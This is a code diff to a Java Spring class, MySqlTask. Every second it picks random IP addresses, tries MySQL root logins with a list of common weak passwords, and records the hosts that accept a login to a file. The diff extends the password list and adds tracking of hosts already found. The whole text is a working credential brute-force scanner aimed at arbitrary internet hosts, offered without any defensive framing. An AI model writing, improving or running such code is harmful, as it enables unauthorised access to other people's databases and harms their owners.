@@ -13,8 +13,10 @@ import java.io.OutputStreamWriter;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.util.Arrays;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Random;
+import java.util.Set;
 
 
 @Component
@@ -25,7 +27,8 @@ public class MySqlTask {
 
     private static final String USER = "root";
     private static final String PATH = "/root/apps/coins/ipList.txt";
-    List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123", "root123456", "12345678");
+    List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123", "root123456", "12345678", "Admin", "admin@123");
+    Set<String> allIp = new HashSet<>();
 
     @Scheduled(cron = "*/1 * * * * ?")
     public void doTask() {
@@ -36,14 +39,18 @@ public class MySqlTask {
         }
     }
 
-    public Connection getConnection() {
+    public void getConnection() {
         String ip = getRandomIp();
+        if (allIp.contains(ip)) {
+            return;
+        }
         for (String pass : checkList) {
             try {
                 Class.forName("com.mysql.jdbc.Driver");
                 String url = "jdbc:mysql://" + ip + ":3306/mysql?useSSL=false&connectTimeout=1500&socketTimeout=1500";
                 conn = (Connection) DriverManager.getConnection(url, USER, pass); //创建连接
                 log.info("ip:" + ip);
+                allIp.add(ip);
                 method2(PATH, ip);
             } catch (Exception e) {
                 if (e.getMessage().contains("YES")) {
@@ -53,7 +60,7 @@ public class MySqlTask {
                 }
             }
         }
-        return conn;
+
     }
 
 
